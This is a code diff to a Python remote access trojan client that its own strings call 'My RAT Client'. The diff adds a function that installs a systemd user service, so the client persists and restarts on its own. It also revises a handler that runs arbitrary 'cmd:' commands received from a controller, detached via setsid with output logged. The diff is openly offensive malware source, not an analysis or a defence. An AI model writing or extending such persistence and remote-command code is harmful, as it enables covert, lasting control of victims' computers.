@@ -21,6 +21,41 @@ def is_windows():
     return os.name == 'nt'
 
 
+def add_self_to_autostart():
+    systemd_dir = os.path.expanduser("~/.config/systemd/user")
+    if not os.path.exists(systemd_dir):
+        os.makedirs(systemd_dir)
+
+    service_name = "myratclient.service"
+    service_path = os.path.join(systemd_dir, service_name)
+
+    exec_path = os.path.abspath(sys.argv[0])
+    python_path = sys.executable
+
+    service_content = f"""[Unit]
+Description=My RAT Client Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={python_path} {exec_path}
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=default.target
+"""
+
+    with open(service_path, "w") as f:
+        f.write(service_content)
+
+    subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
+    subprocess.run(["systemctl", "--user", "enable", service_name], check=True)
+    subprocess.run(["systemctl", "--user", "start", service_name], check=True)
+
+    print(f"[INFO] Автозапуск через systemd установлен: {service_path}")
+
+
 def main():
     try:
         add_self_to_autostart()
@@ -53,21 +88,18 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка команд с nohup/фоновых через setsid и с указанием директории скрипта
+                    # Обработка команд с nohup/фоновых через setsid с указанием директории скрипта
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
-                            # Найдём путь скрипта в команде, если есть python3 "путь"
                             m = re.search(r'python3\s+"([^"]+)"', cmd)
                             if m:
                                 script_path = m.group(1)
                                 script_dir = os.path.dirname(script_path)
                                 log_file = os.path.join(script_dir, "asda.log")
-                                # Формируем команду с setsid и выводом лога в asda.log
                                 run_cmd = (
                                     f'setsid python3 "{script_path}" > "{log_file}" 2>&1 < /dev/null &'
                                 )
                             else:
-                                # Если не нашли, запускаем как есть, cwd - текущая директория клиента
                                 script_dir = os.getcwd()
                                 log_file = os.path.join(script_dir, "asda.log")
                                 run_cmd = f'setsid {cmd} > "{log_file}" 2>&1 < /dev/null &'
